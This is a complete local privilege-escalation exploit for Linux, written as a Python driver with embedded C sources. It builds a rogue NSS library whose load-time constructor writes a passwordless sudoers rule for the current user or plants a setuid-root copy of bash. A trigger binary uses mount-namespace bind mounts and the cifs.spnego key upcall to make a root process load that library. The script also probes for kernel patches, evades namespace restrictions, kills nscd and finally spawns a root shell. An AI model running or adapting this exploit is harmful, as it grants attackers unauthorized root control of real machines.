#!/usr/bin/env python3
import json
import os
import pwd
import re
import shlex
import shutil
import stat
import subprocess
import sys
import textwrap
import time
from pathlib import Path


def _rn():
    import hashlib
    return 'a' + hashlib.md5(str(time.time_ns()).encode()).hexdigest()[:7]


_T = "%s_%s" % (os.getuid(), os.getpid())
_W = Path("/tmp") / ("ses-%s" % _T)
_F = _W / "lib"
_NC = _W / "nc.conf"
_EV = Path("/tmp/.ev_%s" % _T)
_RS = Path("/var/tmp/.rs_%s" % _T)

_MK_LOADED = "LD"
_MK_OK = "SD"
_MK_FB = "FB"


LIBNSS_SRC = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <nss.h>
#include <pwd.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define P_EV @@P_EV@@
#define P_SD @@P_SD@@
#define P_US @@P_US@@
#define P_RS @@P_RS@@
#define M_LD @@M_LD@@
#define M_OK @@M_OK@@
#define M_FB @@M_FB@@

static void xw(int a, const char *b, size_t c) {
    while (c) { ssize_t r = write(a, b, c); if (r <= 0) return; b += r; c -= (size_t)r; }
}

static void xfb(int fd) {
    int i, o; char buf[8192]; ssize_t n;
    i = open("/bin/bash", O_RDONLY | O_CLOEXEC);
    if (i < 0) return;
    o = open(P_RS, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 04755);
    if (o < 0) { close(i); return; }
    while ((n = read(i, buf, sizeof(buf))) > 0) xw(o, buf, (size_t)n);
    fchown(o, 0, 0); fchmod(o, 04755); fsync(o); close(o); close(i);
    if (fd >= 0) dprintf(fd, "%s\n", M_FB);
}

__attribute__((constructor))
static void xi(void) {
    int fd, sf;
    fd = open(P_EV, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
    if (fd >= 0) dprintf(fd, "%s uid=%d euid=%d\n", M_LD, getuid(), geteuid());
    mkdir("/etc/sudoers.d", 0755);
    sf = open(P_SD, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0440);
    if (sf < 0) {
        if (fd >= 0) dprintf(fd, "sd_fail errno=%d\n", errno);
        xfb(fd);
        if (fd >= 0) close(fd);
        return;
    }
    xw(sf, "# x\n", 4);
    dprintf(sf, "%s ALL=(ALL:ALL) NOPASSWD: ALL\n", P_US);
    fchmod(sf, 0440); fsync(sf); close(sf);
    if (fd >= 0) { dprintf(fd, "%s\n", M_OK); close(fd); }
}

enum nss_status @@FUNC@@(uid_t uid, struct passwd *pw,
                          char *buf, size_t len, int *err) {
    const char *n="root", *g="root", *d="/root", *s="/bin/bash";
    size_t need = strlen(n)+strlen(g)+strlen(d)+strlen(s)+4;
    char *p = buf;
    if (len < need) { *err = ERANGE; return NSS_STATUS_TRYAGAIN; }
    strcpy(p, n); pw->pw_name = p; p += strlen(p)+1;
    strcpy(p, g); pw->pw_gecos = p; p += strlen(p)+1;
    strcpy(p, d); pw->pw_dir = p; p += strlen(p)+1;
    strcpy(p, s); pw->pw_shell = p;
    pw->pw_passwd = (char*)"x"; pw->pw_uid = uid; pw->pw_gid = 0;
    *err = 0; return NSS_STATUS_SUCCESS;
}
'''


TRIGGER_SRC = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

static void xd(const char *s) { perror(s); exit(1); }

static void xload(void) {
    char t[] = "/tmp/.xl_XXXXXX";
    char *p; pid_t c; int st;
    p = mkdtemp(t); if (!p) return;
    chmod(p, 0755);
    c = fork();
    if (c == 0) {
        int n = open("/dev/null", O_WRONLY|O_CLOEXEC);
        if (n >= 0) { dup2(n,1); dup2(n,2); }
        execlp("mount","mount","-t","cifs","//127.0.0.1/x",p,"-o","guest,vers=3.0",(char*)0);
        _exit(127);
    }
    if (c > 0) waitpid(c, &st, 0);
    rmdir(p);
}

static void xhide(const char *p) {
    struct stat s;
    if (stat(p,&s)!=0 || !S_ISDIR(s.st_mode)) return;
    mount("tmpfs", p, "tmpfs", 0, "mode=755");
}

static void xbind_ns(const char *src) {
    const char *t[] = {"/etc/nsswitch.conf", "/usr/etc/nsswitch.conf", 0};
    for (int i=0; t[i]; i++) {
        struct stat s;
        if (stat(t[i],&s)!=0) continue;
        if (mount(src, t[i], 0, MS_BIND, 0)==0) {
            fprintf(stderr, "[T] ns bound: %s\n", t[i]);
            return;
        }
    }
    xd("xbind_ns");
}

int main(int ac, char **av) {
    char desc[768]; long r;
    if (ac < 4) { fprintf(stderr, "[T] args: libdir nsswitch libdir1 [libdir2..]\n"); return 2; }

    fprintf(stderr, "[T] pid=%d uid=%d euid=%d\n", getpid(), getuid(), geteuid());

    errno = 0;
    if (unshare(CLONE_NEWNS) == 0) {
        fprintf(stderr, "[T] mount ns: created internally\n");
    } else {
        fprintf(stderr, "[T] mount ns: %s (assuming external)\n", strerror(errno));
    }

    errno = 0;
    r = syscall(__NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING, "x", 0, 0, 0);
    fprintf(stderr, "[T] keyring=%ld e=%d\n", r, errno);

    if (mount(0, "/", 0, MS_REC|MS_PRIVATE, 0) != 0) xd("mp");
    fprintf(stderr, "[T] private ok\n");

    xload();
    fprintf(stderr, "[T] cifs autoload done\n");

    xhide("/run/nscd");
    xhide("/var/run/nscd");
    xbind_ns(av[2]);

    for (int i = 3; i < ac; i++) {
        fprintf(stderr, "[T] bind %s -> %s\n", av[1], av[i]);
        if (mount(av[1], av[i], 0, MS_BIND|MS_REC, 0) != 0) {
            fprintf(stderr, "[T] FAIL: %s\n", strerror(errno));
            xd("mb");
        }
        fprintf(stderr, "[T] ok\n");
    }

    snprintf(desc, sizeof(desc),
        "ver=0x2;host=example.com;ip4=127.0.0.1;sec=krb5;"
        "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
        getpid());
    errno = 0;
    r = syscall(__NR_request_key, "cifs.spnego", desc, "", KEY_SPEC_SESSION_KEYRING);
    fprintf(stderr, "[T] request_key=%ld e=%d (%s)\n", r, errno, strerror(errno));

    sleep(3);
    fprintf(stderr, "[T] done\n");
    return 0;
}
'''


PROBE_SRC = r'''
#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>
int main(void) {
    long kr, rk; int e1, e2;
    kr = syscall(250, 1, "probe", 0, 0, 0);
    errno = 0;
    rk = syscall(249, "cifs.spnego",
        "ver=0x2;host=a;ip4=127.0.0.1;sec=krb5;uid=0x0;creduid=0x0;upcall_target=app;user=root",
        "", -3);
    e1 = errno;
    fprintf(stderr, "rk=%ld e=%d\n", rk, e1);
    errno = 0;
    e2 = unshare(0x00020000) == 0 ? 0 : errno;
    fprintf(stderr, "ns=%d\n", e2);
    return 0;
}
'''


def _j(cmd):
    return " ".join(shlex.quote(str(a)) for a in cmd)

def _run(cmd, check=True, cwd=None):
    c = subprocess.run([str(a) for a in cmd], cwd=str(cwd) if cwd else None,
                       universal_newlines=True, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, check=False)
    if c.stdout:
        print(c.stdout, end="", flush=True)
    if check and c.returncode != 0:
        raise SystemExit("failed: %s (exit %s)" % (_j(cmd), c.returncode))
    return c

def _rq(cmd, cwd=None):
    return subprocess.run([str(a) for a in cmd], cwd=str(cwd) if cwd else None,
                          universal_newlines=True, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, check=False)

def _wt(path, content):
    path.write_text(textwrap.dedent(content).lstrip(), encoding="utf-8")

def _cs(v):
    return json.dumps(str(v))


def _render(user, spath, nn):
    s = LIBNSS_SRC
    s = s.replace("@@P_EV@@", _cs(_EV))
    s = s.replace("@@P_SD@@", _cs(spath))
    s = s.replace("@@P_US@@", _cs(user))
    s = s.replace("@@P_RS@@", _cs(_RS))
    s = s.replace("@@M_LD@@", _cs(_MK_LOADED))
    s = s.replace("@@M_OK@@", _cs(_MK_OK))
    s = s.replace("@@M_FB@@", _cs(_MK_FB))
    s = s.replace("@@FUNC@@", "_nss_%s_getpwuid_r" % nn)
    return s


def _sudo_ok():
    c = subprocess.run(["sudo","-n","/bin/bash","-p","-c","id -u"],
                       universal_newlines=True, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, check=False)
    return c.returncode == 0 and c.stdout.strip() == "0"

def _ev():
    if not _EV.exists(): return ""
    return _EV.read_text(encoding="utf-8", errors="replace")


def _chk_fb():
    try:
        st = _RS.stat()
    except FileNotFoundError:
        raise SystemExit("failed: no fallback")
    if st.st_uid != 0 or not (st.st_mode & stat.S_ISUID):
        raise SystemExit("failed: fallback bad perms (uid=%d mode=%o)" % (st.st_uid, stat.S_IMODE(st.st_mode)))

def _do_fb(user, spath):
    _chk_fb()
    cmd = "printf '%%s\\n' '# x' %s > %s; chown root:root %s; chmod 0440 %s" % (
        shlex.quote("%s ALL=(ALL:ALL) NOPASSWD: ALL" % user),
        shlex.quote(str(spath)), shlex.quote(str(spath)), shlex.quote(str(spath)))
    _run([str(_RS), "-p", "-c", cmd], check=True)


def _probe(workdir):
    _wt(workdir / "probe.c", PROBE_SRC)
    c = _rq(["gcc", "-Wno-all", "-o", "probe", "probe.c"], cwd=workdir)
    if c.returncode != 0:
        return None, None

    rk_errno_init = None
    ns_errno = None

    c = _rq([str(workdir / "probe")])
    for line in (c.stdout or "").splitlines():
        line = line.strip()
        if line.startswith("rk="):
            try: rk_errno_init = int(line.split("e=")[1])
            except: pass
        if line.startswith("ns="):
            try: ns_errno = int(line.split("=")[1])
            except: pass

    return rk_errno_init, ns_errno


def _select_mode(workdir):
    rk_errno, ns_errno = _probe(workdir)
    print("[*] probe: request_key errno=%s, unshare(CLONE_NEWNS) errno=%s" % (rk_errno, ns_errno), flush=True)

    if rk_errno == 0 or (rk_errno is not None and rk_errno != 1):
        if ns_errno == 0:
            print("[*] mode: direct (trigger has mount ns + init user ns)", flush=True)
            return "direct"
        else:
            print("[*] mode: unshare -m (mount ns only, no user ns)", flush=True)
            return "mntns"

    userns_ok = _rq(["unshare", "-Ur", "-m", "true"]).returncode == 0
    if userns_ok:
        rk_userns = None
        c = _rq(["unshare", "-Ur", "-m", str(workdir / "probe")])
        for line in (c.stdout or "").splitlines():
            if line.strip().startswith("rk="):
                try: rk_userns = int(line.strip().split("e=")[1])
                except: pass
        if rk_userns == 0 or (rk_userns is not None and rk_userns != 1):
            print("[*] mode: unshare -Ur -m (user+mount ns, unpatched kernel)", flush=True)
            return "userns"

    if ns_errno == 0:
        print("[!] request_key blocked (errno=%s) but mount ns works" % rk_errno, flush=True)
        print("[!] trigger needs cap_sys_admin to bypass user namespace restriction", flush=True)
        return "need_caps"

    return "blocked"


def main():
    for cmd in ["bash","gcc","mount","sudo","unshare"]:
        if not shutil.which(cmd):
            raise SystemExit("failed: missing %s" % cmd)

    if os.getuid() == 0:
        raise SystemExit("failed: run as unprivileged user")
    user = pwd.getpwuid(os.getuid()).pw_name
    if not re.match(r"^[A-Za-z0-9_.-]+[$]?$", user):
        raise SystemExit("failed: bad username")

    spath = Path("/etc/sudoers.d/s-%s" % _T)

    ldirs = []
    seen = set()
    for c in [Path("/usr/lib64"), Path("/lib64"),
              Path("/lib/x86_64-linux-gnu"), Path("/usr/lib/x86_64-linux-gnu")]:
        if not (c / "libnss_files.so.2").exists(): continue
        r = c.resolve()
        if str(r) not in seen:
            seen.add(str(r)); ldirs.append(r)
    if not ldirs:
        raise SystemExit("failed: no nss lib dir")

    if _sudo_ok():
        raise SystemExit("failed: already root")

    shutil.rmtree(str(_W), ignore_errors=True)
    _F.mkdir(parents=True)

    mode = _select_mode(_W)

    if mode == "blocked":
        raise SystemExit(
            "failed: request_key blocked and no mount namespace available.\n"
            "This kernel blocks cifs.spnego key construction.\n"
            "Setup for local testing (as root):\n"
            "  sudo dnf install cifs-utils keyutils\n"
            "  sudo modprobe cifs\n"
            "  grep -q cifs.spnego /etc/request-key.conf || "
            "echo 'create  cifs.spnego  *  *  /usr/sbin/cifs.upcall %%k' | sudo tee -a /etc/request-key.conf"
        )

    if mode == "need_caps":
        print("\n[!] Patched kernel detected - request_key blocked from user namespace.", flush=True)
        print("[!] Fix: give the trigger binary CAP_SYS_ADMIN so it can create", flush=True)
        print("[!] a mount namespace WITHOUT a user namespace.", flush=True)
        print("[!] The script will compile the trigger, then you need to run:", flush=True)
        print("[!]   sudo setcap cap_sys_admin+ep <trigger_path>", flush=True)
        print("[!] Then re-run this script.\n", flush=True)

    nn = _rn()
    so_name = "libnss_%s.so.2" % nn

    print("[*] nss module: %s" % nn, flush=True)
    print("[*] library: %s" % so_name, flush=True)
    print("[*] lib dirs: %s" % [str(d) for d in ldirs], flush=True)

    src = _render(user, spath, nn)
    assert ("_nss_%s_getpwuid_r" % nn) in src, "symbol mismatch!"

    _wt(_W / "a.c", src)
    _wt(_W / "b.c", TRIGGER_SRC)
    _wt(_NC, """
        passwd: %s files
        group: files
        shadow: files
        hosts: files dns
    """ % nn)

    _run(["gcc","-shared","-fPIC","-Wno-all","-o","lib/%s" % so_name,"a.c"], cwd=_W)

    print("[*] verify symbol:", flush=True)
    _run(["nm","-D","lib/%s" % so_name], cwd=_W, check=False)

    tn = _rn()
    _run(["gcc","-Wno-all","-o",tn,"b.c"], cwd=_W)

    trigger_path = _W / tn

    if mode == "need_caps":
        cap_ok = _rq(["sudo", "-n", "setcap", "cap_sys_admin+ep", str(trigger_path)]).returncode == 0
        if not cap_ok:
            print("\n[!] Cannot auto-set caps. Run this manually, then re-run the script:", flush=True)
            print("    sudo setcap cap_sys_admin+ep %s" % trigger_path, flush=True)
            raise SystemExit("failed: trigger needs cap_sys_admin")
        print("[+] cap_sys_admin set on trigger", flush=True)
        mode = "direct"

    _rq(["killall","-9","nscd"])

    print("\n[*] running trigger (mode=%s)..." % mode, flush=True)

    if mode == "direct":
        _run(
            [str(trigger_path), str(_F), str(_NC)] + [str(d) for d in ldirs],
            cwd=_W, check=True,
        )
    elif mode == "mntns":
        _run(
            ["unshare", "-m", str(trigger_path), str(_F), str(_NC)] + [str(d) for d in ldirs],
            cwd=_W, check=True,
        )
    else:
        userns_cmd = ["unshare", "-Ur", "-m"]
        if _rq(userns_cmd + ["true"]).returncode != 0:
            aa = shutil.which("aa-exec")
            if aa and _rq(["aa-exec","-p","trinity","--"] + userns_cmd + ["true"]).returncode == 0:
                userns_cmd = ["aa-exec","-p","trinity","--"] + userns_cmd
            else:
                raise SystemExit("failed: no userns")
        _run(
            userns_cmd + [str(trigger_path), str(_F), str(_NC)] + [str(d) for d in ldirs],
            cwd=_W, check=True,
        )

    time.sleep(2)

    ev = _ev()
    print("\n[*] evidence: %r" % ev, flush=True)

    if not ev:
        cifs = False
        try:
            fs = Path("/proc/filesystems").read_text()
            cifs = any(l.split()[-1:] == ["cifs"] for l in fs.splitlines())
        except: pass
        if not cifs:
            raise SystemExit("failed: cifs module not loaded (modprobe cifs?)")
        raise SystemExit("failed: no evidence - constructor never ran")

    if _MK_OK in ev:
        print("[+] sudoers written!", flush=True)
    elif _MK_FB in ev:
        print("[*] using fallback shell", flush=True)
        _do_fb(user, spath)
    elif _MK_LOADED in ev:
        print("[*] module loaded but no privesc. evidence:", flush=True)
        print(ev, flush=True)
        raise SystemExit("failed: module loaded, privesc failed")
    else:
        raise SystemExit("failed: unexpected evidence: %r" % ev)

    if not _sudo_ok():
        raise SystemExit("failed: sudo not working")

    print("[+] got root, spawning shell", flush=True)
    os.execvp("sudo", ["sudo","-n","/bin/bash","-p"])


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
